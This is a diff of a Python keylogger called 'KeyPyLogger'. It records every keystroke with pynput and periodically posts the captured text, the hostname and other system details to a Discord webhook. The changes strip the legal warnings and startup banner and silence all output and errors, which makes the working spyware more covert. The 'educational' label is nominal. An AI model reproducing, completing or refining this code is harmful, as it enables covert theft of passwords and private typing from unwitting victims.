@@ -1,8 +1,7 @@
 #!/usr/bin/env python3
 """
-KeyPyLogger - Educational Keylogger
-LEGAL WARNING: This tool is for educational and authorized security testing only.
-Unauthorized use is illegal. Only use on systems you own or have explicit permission to test.
+KeyPyLogger - Windows Version
+Educational keylogger for authorized security testing
 """
 
 import os
@@ -10,26 +9,23 @@ import sys
 import platform
 import threading
 import time
-from datetime import datetime
+from datetime import datetime, timezone
 from pynput import keyboard
 import requests
 import json
 
-# Configuration - Will be replaced by builder
-WEBHOOK_URL = "WEBHOOK_URL_PLACEHOLDER"
+# ============================================================================
+# CONFIGURATION - EDIT THESE VALUES BEFORE USE/COMPILING
+# ============================================================================
+WEBHOOK_URL = "YOUR_DISCORD_WEBHOOK_URL_HERE"
 SEND_INTERVAL = 60  # Send logs every 60 seconds
 MAX_BUFFER_SIZE = 1000  # Maximum characters before forcing send
+# ============================================================================
 
 
 class KeyLogger:
     def __init__(self, webhook_url, send_interval=60):
-        """
-        Initialize the keylogger
-
-        Args:
-            webhook_url (str): Discord webhook URL
-            send_interval (int): Interval in seconds to send logs
-        """
+        """Initialize the keylogger"""
         self.webhook_url = webhook_url
         self.send_interval = send_interval
         self.log_buffer = []
@@ -49,11 +45,9 @@ class KeyLogger:
     def _format_key(self, key):
         """Format key press for logging"""
         try:
-            # Handle special keys
             if hasattr(key, 'char') and key.char is not None:
                 return key.char
             else:
-                # Special keys formatting
                 special_keys = {
                     keyboard.Key.space: ' ',
                     keyboard.Key.enter: '\n',
@@ -83,12 +77,11 @@ class KeyLogger:
             formatted_key = self._format_key(key)
             self.log_buffer.append(formatted_key)
 
-            # Force send if buffer is too large
             if len(''.join(self.log_buffer)) >= MAX_BUFFER_SIZE:
                 self._send_logs()
 
         except Exception as e:
-            print(f"Error in key press handler: {e}")
+            pass  # Silent fail in production
 
     def _send_logs(self):
         """Send accumulated logs to Discord webhook"""
@@ -96,7 +89,6 @@ class KeyLogger:
             return
 
         try:
-            # Prepare the message
             log_content = ''.join(self.log_buffer)
 
             if not log_content.strip():
@@ -105,11 +97,10 @@ class KeyLogger:
 
             timestamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
 
-            # Create Discord embed
             embed = {
                 "title": f"🔑 Keylog Report - {self.system_info['hostname']}",
-                "description": f"```\n{log_content[:4000]}\n```",  # Discord limit
-                "color": 3447003,  # Blue color
+                "description": f"```\n{log_content[:4000]}\n```",
+                "color": 3447003,
                 "fields": [
                     {
                         "name": "System",
@@ -137,7 +128,6 @@ class KeyLogger:
                 "embeds": [embed]
             }
 
-            # Send to webhook
             response = requests.post(
                 self.webhook_url,
                 json=payload,
@@ -145,13 +135,10 @@ class KeyLogger:
             )
 
             if response.status_code == 204:
-                # Successfully sent, clear buffer
                 self.log_buffer = []
-            else:
-                print(f"Failed to send logs: {response.status_code}")
 
         except Exception as e:
-            print(f"Error sending logs: {e}")
+            pass  # Silent fail in production
 
     def _periodic_send(self):
         """Periodically send logs at specified interval"""
@@ -162,38 +149,29 @@ class KeyLogger:
 
     def start(self):
         """Start the keylogger"""
-        print(f"[*] Starting KeyPyLogger on {self.system_info['os']}")
-        print(f"[*] Hostname: {self.system_info['hostname']}")
-        print(f"[*] Logs will be sent every {self.send_interval} seconds")
-
-        # Send initial system info
         self._send_initial_info()
 
-        # Start periodic send thread
         self.running = True
         send_thread = threading.Thread(target=self._periodic_send, daemon=True)
         send_thread.start()
 
-        # Start keyboard listener
         try:
             with keyboard.Listener(on_press=self._on_press) as listener:
                 listener.join()
         except KeyboardInterrupt:
-            print("\n[*] Stopping keylogger...")
             self.stop()
 
     def stop(self):
         """Stop the keylogger and send remaining logs"""
         self.running = False
-        self._send_logs()  # Send any remaining logs
-        print("[*] Keylogger stopped")
+        self._send_logs()
 
     def _send_initial_info(self):
         """Send initial system information"""
         try:
             embed = {
                 "title": "🚀 KeyPyLogger Started",
-                "color": 5763719,  # Green
+                "color": 5763719,
                 "fields": [
                     {"name": "Hostname", "value": self.system_info['hostname'], "inline": True},
                     {"name": "OS", "value": self.system_info['os'], "inline": True},
@@ -201,7 +179,7 @@ class KeyLogger:
                     {"name": "OS Version", "value": self.system_info['os_version'][:100], "inline": False},
                     {"name": "Python Version", "value": self.system_info['python_version'], "inline": True},
                 ],
-                "timestamp": datetime.utcnow().isoformat(),
+                "timestamp": datetime.now(timezone.utc).isoformat(),
                 "footer": {"text": "KeyPyLogger - Educational Purpose Only"}
             }
 
@@ -209,26 +187,16 @@ class KeyLogger:
             requests.post(self.webhook_url, json=payload, timeout=10)
 
         except Exception as e:
-            print(f"Error sending initial info: {e}")
+            pass  # Silent fail
 
 
 def main():
     """Main entry point"""
-    # Check if webhook URL is configured
-    if WEBHOOK_URL == "WEBHOOK_URL_PLACEHOLDER":
-        print("[!] ERROR: Webhook URL not configured!")
-        print("[!] Please use builder.py to configure the keylogger")
+    # Validate webhook
+    if not WEBHOOK_URL or "discord.com/api/webhooks" not in WEBHOOK_URL:
+        print("[!] ERROR: Invalid webhook URL!")
+        print("[!] Please edit the WEBHOOK_URL in this script")
         sys.exit(1)
-
-    # Legal warning
-    print("=" * 70)
-    print("KeyPyLogger - Educational Keylogger")
-    print("=" * 70)
-    print("WARNING: This tool is for EDUCATIONAL and AUTHORIZED testing only!")
-    print("Unauthorized use of keyloggers is ILLEGAL and unethical.")
-    print("Only use on systems you own or have explicit written permission.")
-    print("=" * 70)
-    print()
 
     # Create and start keylogger
     logger = KeyLogger(WEBHOOK_URL, SEND_INTERVAL)
@@ -238,7 +206,6 @@ def main():
     except KeyboardInterrupt:
         logger.stop()
     except Exception as e:
-        print(f"[!] Error: {e}")
         logger.stop()
 
 
